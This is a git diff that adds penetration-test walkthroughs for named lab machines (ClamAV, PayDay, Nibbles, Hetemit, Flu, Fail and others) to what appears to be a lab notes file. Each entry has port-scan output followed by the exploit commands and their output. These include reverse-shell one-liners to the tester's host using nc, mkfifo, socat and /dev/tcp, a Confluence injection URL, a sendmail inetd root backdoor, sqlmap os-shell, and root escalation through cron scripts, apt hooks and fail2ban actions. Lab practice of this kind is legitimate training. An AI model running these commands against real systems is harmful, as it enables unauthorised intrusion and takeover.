@@ -1978,8 +1978,6 @@ cat proof.txt
 211dd14bfa93c1a45cb53ed09a92b9d1
 ```
 
-
-
 ## Zipper
 
 All in one 
@@ -2024,3 +2022,1052 @@ ssh root@192.168.120.119
 WildCardsGoingWild 
 ```
 
+
+## ClamAV 
+
+1. Port scan
+```
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
+|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
+25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
+| smtp-commands: localhost.localdomain Hello [192.168.45.155], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
+|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
+80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
+|_http-title: Ph33r
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+199/tcp   open  smux        Linux SNMP multiplexer
+445/tcp   open  netbios-ssn Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
+60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
+|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
+Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Found exploit for sendmail 8.13.4. Download it and run. 
+```
+perl 4761.pl 192.168.206.42
+Sendmail w/ clamav-milter Remote Root Exploit
+Copyright (C) 2007 Eliteboy
+Attacking 192.168.206.42...
+220 localhost.localdomain ESMTP Sendmail 8.13.4/8.13.4/Debian-3sarge3; Wed, 8 May 2024 02:2 (No UCE/UBE) logging access from: [192.168.45.155](FAIL)-[192.168.45.155]
+250-localhost.localdomain Hello [192.168.45.155], pleased to meet you
+250-ENHANCEDSTATUSCODES
+250-PIPELINING
+250-EXPN
+250-VERB
+250-8BITMIME
+250-SIZE
+250-DSN
+250-ETRN
+250-DELIVERBY
+250 HELP
+250 2.1.0 <>... Sender ok
+250 2.1.5 <nobody+"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf">... k
+250 2.1.5 <nobody+"|/etc/init.d/inetd restart">... Recipient ok
+354 Enter mail, end with "." on a line by itself
+250 2.0.0 4486Liet004012 Message accepted for delivery
+221 2.0.0 localhost.localdomain closing connection
+```
+
+3. Got root. 
+```
+ nc -nv 192.168.206.42 31337 
+(UNKNOWN) [192.168.206.42] 31337 (?) open
+id
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
+cd root
+ls
+dbootstrap_settings
+install-report.template
+proof.txt
+cat proof.txt
+5ee8b3db8b48fd82c1c81ed4c8d30bd7
+```
+
+## PayDay
+
+1. Port scan 
+```
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
+|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
+80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
+|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
+|_http-title: CS-Cart. Powerful PHP shopping cart software
+110/tcp open  pop3        Dovecot pop3d
+|_pop3-capabilities: STLS SASL CAPA PIPELINING RESP-CODES UIDL TOP
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+|_ssl-date: 2024-05-08T02:32:54+00:00; +7s from scanner time.
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
+143/tcp open  imap        Dovecot imapd
+|_ssl-date: 2024-05-08T02:32:54+00:00; +7s from scanner time.
+|_imap-capabilities: CHILDREN SORT NAMESPACE MULTIAPPEND OK LOGINDISABLEDA0001 STARTTLS SASL-IR LITERAL+ IMAP4rev1 UNSELECT THREAD=REFERENCES Capability completed LOGIN-REFERRALS IDLE
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
+993/tcp open  ssl/imap    Dovecot imapd
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+|_imap-capabilities: SORT CHILDREN MULTIAPPEND Capability OK NAMESPACE SASL-IR LITERAL+ IMAP4rev1 UNSELECT THREAD=REFERENCES AUTH=PLAINA0001 completed LOGIN-REFERRALS IDLE
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+|_ssl-date: 2024-05-08T02:32:53+00:00; +6s from scanner time.
+995/tcp open  ssl/pop3    Dovecot pop3d
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|_    SSL2_RC4_128_EXPORT40_WITH_MD5
+|_ssl-date: 2024-05-08T02:32:53+00:00; +6s from scanner time.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Found exploit for webpage. https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c (admin:admin) upload shell.phtml and open it, gives foothold. 
+
+3. Found user name patrick. Found root:root creds but unable to login so, guess pattrik:patrick creds for ssh. Obtained root. 
+```
+ssh patrick@192.168.206.39 -oHostKeyAlgorithms=+ssh-dss
+patrick@payday:~$ sudo -l
+
+sudo su
+root
+```
+
+## Snookums 
+
+1. Port Scan 
+```
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 3.0.2
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.45.155
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.2 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: TIMEOUT
+22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
+|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
+|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
+80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-title: Simple PHP Photo Gallery
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
+3306/tcp  open  mysql       MySQL (unauthorized)
+33060/tcp open  mysqlx?
+```
+
+2. Found a payload expltoit for Simple PHP Photo Gallery v0.8 which shows where to add payload. 
+```
+http://192.168.206.58/image.php?i=payload (http://192.168.x.x/shell.php monkey php reverse), only port 445 allowed
+```
+
+3. Obtained revese shell, find out pwnkit can root it. 
+```
+bash-4.2$ ./PwnKit
+./PwnKit
+id
+uid=0(root)
+```
+
+## Pebbles
+1. Port scan: 3305 vulnerable with sql
+2. sqlmap gives shell with root. 
+```
+sqlmap http://192.168.206.52/zm/index.php --data="view=request&request=log&task=query&limit=100&minTime=5" -p limit --os-shell
+```
+## Nibbles
+1. Port scan
+```
+Open 192.168.206.47:21
+Open 192.168.206.47:22
+Open 192.168.206.47:80
+Open 192.168.206.47:5437
+```
+
+2. Found exploit for postgres. PostgreSQL 9.3-11.7 - Remote Code Execution (RCE) (Authenticated). Run it and obtained foothold. (only port 80 was allowed)
+```
+python3 50847.py -i 192.168.206.47 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.155 80 >/tmp/f' -p 5437
+```
+
+3. Rooted with find SUID. 
+
+
+## Hetemit
+1. Port scan
+```
+PORT      STATE SERVICE      REASON
+21/tcp    open  ftp          syn-ack
+22/tcp    open  ssh          syn-ack
+80/tcp    open  http         syn-ack
+139/tcp   open  netbios-ssn  syn-ack
+445/tcp   open  microsoft-ds syn-ack
+18000/tcp open  biimenu      syn-ack
+50000/tcp open  ibm-db2      syn-ack
+```
+
+2. Obtained foothold 
+```
+curl -X POST --data "code=os.system('socat TCP:192.168.45.155:18000 EXEC:sh')" http://192.168.206.117:50000/verify
+```
+
+3. Found root.service file. Use it to root. 
+```
+[cmeeks@hetemit ~]$ cat /etc/systemd/system/pythonapp.service
+cat /etc/systemd/system/pythonapp.service
+[Unit]
+Description=Python App
+After=network-online.target
+
+[Service]
+Type=simple
+WorkingDirectory=/home/cmeeks/restjson_hetemit
+ExecStart=flask run -h 0.0.0.0 -p 50000
+TimeoutSec=30
+RestartSec=15s
+User=cmeeks
+ExecReload=/bin/kill -USR1 $MAINPID
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+
+
+[cmeeks@hetemit ~]$ cat <<'EOT'> /home/cmeeks/reverse.sh
+#!/bin/bash
+socat TCP:192.168.118.8:18000 EXEC:sh
+EOT
+
+[cmeeks@hetemit ~]$ chmod +x /home/cmeeks/reverse.sh
+
+
+[cmeeks@hetemit ~]$ sudo reboot
+
+kali@kali:~$ nc -lvnp 18000
+listening on [any] 18000 ...
+connect to [192.168.118.8] from (UNKNOWN) [192.168.120.36] 57890
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+[root@hetemit /]# whoami
+root
+
+[root@hetemit /]#
+```
+
+## Zenphoto
+
+1. Port scan
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
+|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
+23/tcp   open  ipp     CUPS 1.4
+|_http-server-header: CUPS/1.4
+|_http-title: 403 Forbidden
+| http-methods: 
+|_  Potentially risky methods: PUT
+80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
+|_http-server-header: Apache/2.2.14 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+3306/tcp open  mysql   MySQL (unauthorized)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Found /test subdirectory with zenphoto version 1.4.1.4 (source page reveal it)
+
+3. Download and run exploit. Obtained foothold. 
+```
+php 18083.php 192.168.241.41 /test/
+
++-----------------------------------------------------------+
+| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
++-----------------------------------------------------------+
+
+zenphoto-shell# id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+4. Rooted with linpeas which suggest [CVE-2010-3904] kernal rds exploit 
+```
+www-data@offsecsrv:/tmp$ gcc -pthread 15285.c -o 1
+gcc -pthread 15285.c -o 1
+www-data@offsecsrv:/tmp$ ./1
+uid=0(firefart) gid=0(root)
+```
+
+## Nukem 
+1. Port Scan 
+```
+PORT      STATE SERVICE REASON
+22/tcp    open  ssh     syn-ack
+80/tcp    open  http    syn-ack
+3306/tcp  open  mysql   syn-ack
+5000/tcp  open  upnp    syn-ack
+13000/tcp open  unknown syn-ack
+36445/tcp open  unknown syn-ack
+```
+
+2. Found vulnerable plugin. (simple-file-list). Run exploit and obtained foothold. 
+```
+python 48979.py http://192.168.241.105/
+
+nc -nlvp 13000
+listening on [any] 13000 ...
+connect to [192.168.45.155] from (UNKNOWN) [192.168.241.105] 57940
+bash: cannot set terminal process group (350): Inappropriate ioctl for device
+bash: no job control in this shell
+[http@nukem simple-file-list]$ id
+id
+uid=33(http) gid=33(http) groups=33(http)
+```
+
+3. Linpeas reveal commander user creds. Logged in . 
+
+4. Rooted with dosbox SUID. 
+
+## Levram 
+1. Port scan
+```
+PORT     STATE SERVICE  REASON
+22/tcp   open  ssh      syn-ack
+8000/tcp open  http-alt syn-ack
+```
+
+2. Found exploit for gerapy 0.9.7. Created new project at first. Then run. Obtained local.txt
+```
+python3 cve-2021-43857.py -t 192.168.241.24 -p 8000 -L 192.168.45.155 -P 445
+```
+
+3. Found python Capabilities. Use it for Privesc. 
+```
+app@ubuntu:~$ python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+python3.10 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+id
+uid=0(root) gid=1000(app) groups=1000(app)
+```
+
+## Mzeeav
+
+1. Port scan
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
+|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
+|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+|_http-server-header: Apache/2.4.56 (Debian)
+|_http-title: MZEE-AV - Check your files
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Added MZ at beginning of shell.php (monkey rev). Obtained reverse shell. 
+```
+http://192.168.241.33/upload/shell.php
+```
+
+3. Rooted with /opt/fileS SUID. 
+```
+www-data@mzeeav:/$ /opt/fileS . -exec /bin/sh -p \; -quit
+```
+
+## Ochima
+1. Port Scan 
+```
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack
+80/tcp   open  http    syn-ack
+8338/tcp open  unknown syn-ack
+```
+
+2. Found service maltrail v0.52 running which has exploit. Get foothold. 
+```
+ python3 exploit.py 192.168.45.155 80 http://192.168.241.32:8338/     
+Running exploit on http://192.168.241.32:8338//login
+```
+
+3. Ran pspy64, found out the cron file. Use it to rooted. 
+```
+2024/05/09 04:45:01 CMD: UID=0    PID=26771  | /bin/sh -c /var/backups/etc_Backup.sh 
+
+echo "chmod u+s /usr/bin/bash" >> etc_Backup.sh
+
+snort@ochima:/var/backups$ bash -p
+```
+
+## Flu
+1. Port Scan 
+```
+PORT     STATE SERVICE      REASON
+22/tcp   open  ssh          syn-ack
+8090/tcp open  opsmessaging syn-ack
+8091/tcp open  jamlink      syn-ack
+```
+
+2. Confluence foothold. 
+```
+http://192.168.241.41:8090/login.action?os_destination=%2F%24%7Bnew+javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new+java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.45.155%2F1234+0%3E%261%27%29.start%28%29%22%29%7D%2Findex.action&permissionViolation=true
+```
+
+3. Find /opt/log-backu.sh cronfile using pspy64. Rooted adding bash SUID
+```
+confluence@flu:/opt$ echo "chmod u+s /usr/bin/bash" >> log-backup.sh
+
+bash -p 
+```
+
+
+## Sorcerer
+1. Port Scan
+```
+PORT      STATE SERVICE    REASON
+22/tcp    open  ssh        syn-ack
+80/tcp    open  http       syn-ack
+111/tcp   open  rpcbind    syn-ack
+2049/tcp  open  nfs        syn-ack
+7742/tcp  open  msss       syn-ack
+8080/tcp  open  http-proxy syn-ack
+38921/tcp open  unknown    syn-ack
+39103/tcp open  unknown    syn-ack
+40685/tcp open  unknown    syn-ack
+54405/tcp open  unknown    syn-ack
+```
+
+2. After enumeration, found zip file at http://192.168.241.100:7742/zipfiles/
+
+3. Download max.zip. Figure out scp is working with that keys but ssh is prevented. 
+
+4. Clean up the authorized keys, and copied to the destination. 
+```
+scp -O -i id_rsa authorized_keys max@192.168.241.100:/home/max/.ssh/authorized_keys
+```
+
+5. Ssh connection and foothold. 
+
+7. Rooted with SUID. 
+```
+max@sorcerer:/tmp$ /usr/sbin/start-stop-daemon -n $RANDOM -S -x /bin/sh -- -p
+```
+
+## Fail 
+
+1. Port scan 
+```
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
+|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
+|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
+873/tcp open  rsync   (protocol version 31)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Rsync file upload
+```
+rsync -av --list-only rsync://192.168.173.126/fox
+receiving incremental file list
+drwxr-xr-x          4,096 2021/01/21 09:21:59 .
+lrwxrwxrwx              9 2020/12/03 15:22:42 .bash_history -> /dev/null
+-rw-r--r--            220 2019/04/18 00:12:36 .bash_logout
+-rw-r--r--          3,526 2019/04/18 00:12:36 .bashrc
+-rw-r--r--            807 2019/04/18 00:12:36 .profile
+
+ssh-keygen
+
+rsync -av .ssh  rsync://192.168.173.126/fox/ 
+```
+
+3. Ssh login and changed fail2ban file config file. 
+```
+sed -i 's:actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>:actionban = nc 192.168.118.5 4444 -e /usr/bin/bash:g' /etc/fail2ban/action.d/iptables-multiport.conf
+```
+
+4. Fail ssh attempt, get reverse shell
+```
+ ssh fox@192.168.173.126
+fox@192.168.173.126's password: 
+Permission denied, please try again
+
+nc -nlvp 8888
+listening on [any] 8888 ...
+connect to [192.168.45.244] from (UNKNOWN) [192.168.173.126] 36518
+SHELL=/bin/bash script -q /dev/null
+root@fail:
+```
+
+## CVE-2023-33831 
+1. Port scan
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
+|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
+|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
+1881/tcp open  http    Node.js Express framework
+|_http-cors: GET POST PUT DELETE
+|_http-title: FUXA
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Run exploit and obtained root. 
+```
+https://github.com/rodolfomarianocy/Unauthenticated-RCE-FUXA-CVE-2023-33831
+
+
+python CVE-2023-33831.py --rhost 192.168.200.35 --rport 1881 --lhost 192.168.45.156 --lport 8090
+/home/kali/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.8) or chardet (5.2.0)/charset_normalizer (2.0.12) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
+
+listening on [any] 8090 ...
+connect to [192.168.45.156] from (UNKNOWN) [192.168.200.35] 39560
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+## CVE-2023-40582 
+1. Port scan
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; pr
+| ssh-hostkey: 
+|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
+|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
+|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
+3000/tcp open  http    Node.js Express framework
+|_http-title: Command Guess Game
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Enter this command for reverse shell and use penelope.py for better shell. 
+```
+id | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.45.156 8000 >/tmp/f
+
+./penelope.py 8000  
+```
+
+3. Rooted 
+```
+/penelope.py 8000
+[+] Listening for reverse shells on 0.0.0.0 🚪8000 
+➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[-] Invalid shell from 192.168.200.36 🙄
+[-] Invalid shell from 192.168.200.36 🙄
+[+] Got reverse shell from 🐧 192.168.200.36 💀 - Assigned SessionID <3>
+[+] Attempting to upgrade shell to PTY...
+[+] Shell upgraded successfully using /usr/bin/python3! 💪
+[+] Interacting with session [3], Shell Type: PTY, Menu key: F12 
+[+] Logging to /home/kali/.penelope/192.168.200.36/192.168.200.36.log 📜
+root@ubuntu:/usr/src/app# ls
+index.html  node_modules  package.json  package-lock.json  server.js
+root@ubuntu:/usr/src/app# cd /root
+root@ubuntu:~# ls
+email5.txt  proof.txt  snap
+root@ubuntu:~# cat proof.txt
+c3590054c94d30766690d03c4cc7c4bb
+```
+
+## Flimsy 
+1. Nmap 
+```
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
+|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
+|_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
+80/tcp    open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Upright
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+3306/tcp  open  mysql   MySQL (unauthorized)
+43500/tcp open  http    OpenResty web app server
+|_http-server-header: APISIX/2.8
+|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Found exploit for apisix 2.8 - 50829. Use it to get foothold. 
+```
+python3 50829.py http://192.168.200.220:43500/ 192.168.45.156 1212
+
+connect to [192.168.45.156] from (UNKNOWN) [192.168.200.220] 45858
+id
+uid=65534(franklin) gid=65534(nogroup) groups=65534(nogroup)
+```
+
+3. Linpeas shows writable /etc/apt/apt.conf.d and cronjob at /etc/crontab. Created new reverse shell file. 
+```
+* * * * * root apt-get update
+
+franklin@flimsy:/etc/apt/apt.conf.d$ echo 'apt::Update::Pre-Invoke{"rm /tmp/f;mkfifo /tmp/f;c -i 2>&1|nc 192.168.45.156 8000 >/tmp/f"};' > shell
+```
+
+4. Obtained reverse shell. 
+```
+root@flimsy:~# cat proof.txt
+cat proof.txt
+10a69be60365b1d21ba003882be27f16
+```
+
+## CVE-2023-6019 
+1. Port scan 
+```
+9000/tcp  open  http    aiohttp 3.9.1 (Python 3.8)
+|_http-server-header: Python/3.8 aiohttp/3.9.1
+|_http-title: Ray Dashboard
+```
+
+2. Found exploit, run it and obtained shell. https://github.com/Clydeston/CVE-2023-6019
+```
+python3 CVE-2023-6019.py -t 192.168.200.37 -p 9000 -l 192.168.45.156 -lp 4444
+
+nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.156] from (UNKNOWN) [192.168.200.37] 47584
+root@ubuntu:/opt# cd /root
+cd /root
+root@ubuntu:~# ls
+ls
+email6.txt  proof.txt  reboot.lock  snap
+root@ubuntu:~# cat proof.txt
+cat proof.txt
+ac31fbb1a0b2eec9cc7ef31ddfa709a5
+```
+
+## Bullybox
+1. Nmap scan
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
+|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+| http-git: 
+|   192.168.200.27:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|_    Last commit message: Ready For launch 
+|_http-title: Client Area 
+| http-robots.txt: 8 disallowed entries 
+| /boxbilling/bb-data/ /bb-data/ /bb-library/ 
+|_/bb-locale/ /bb-modules/ /bb-uploads/ /bb-vendor/ /install/
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+2. Found git sub directory. Then, dump it and check for credentails. 
+```
+git-dumper http://bullybox.local/.git bullyboxgit
+
+found creds on bb-config 
+```
+
+3. Download authenticated exploit and then obtained foothold. 
+```
+https://github.com/kabir0x23/CVE-2022-3552/
+
+python3 CVE-2022-3552.py -d http://bullybox.local/ -u admin@bullybox.local -p Playing-Unstylish7-Provided
+
+nc -nlvp 1337                  
+listening on [any] 1337 ...
+connect to [192.168.45.156] from (UNKNOWN) [192.168.200.27] 45902
+Linux bullybox 5.15.0-75-generic #82-Ubuntu SMP Tue Jun 6 23:10:23 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+ 05:16:20 up 24 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
+```
+
+4. Rooted and obtained proof. 
+```
+yuki@bullybox:/$ sudo su
+sudo su
+root@bullybox:/#
+```
+
+## Zino
+1. Port scan
+```
+Open 192.168.200.64:21
+Open 192.168.200.64:22
+Open 192.168.200.64:139
+Open 192.168.200.64:445
+Open 192.168.200.64:3306
+Open 192.168.200.64:8003
+```
+
+2. Found 'admin:adminadmin' credentials in smb share 'zino' misc.log. 
+
+3. Found exploit - https://github.com/F-Masood/Booked-Scheduler-2.7.5---RCE-Without-MSF (Booked Scheduler 2.7.5)
+
+4. Upload monkey pentest and obtained foothold. And then found cronjob. /var/www/html/booked/cleanup.py
+
+5. Vi was restrictive so used cat EOF to root. 
+```
+www-data@zino:/var/www/html/booked$ cat << 'EOT' > /var/www/html/booked/cleanup.py
+<ked$ cat << 'EOT' > /var/www/html/booked/cleanup.py
+> #!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('chmod u+s /usr/bin/bash')
+except:
+        print 'ERROR...'
+sys.exit(0)#!/usr/bin/env python
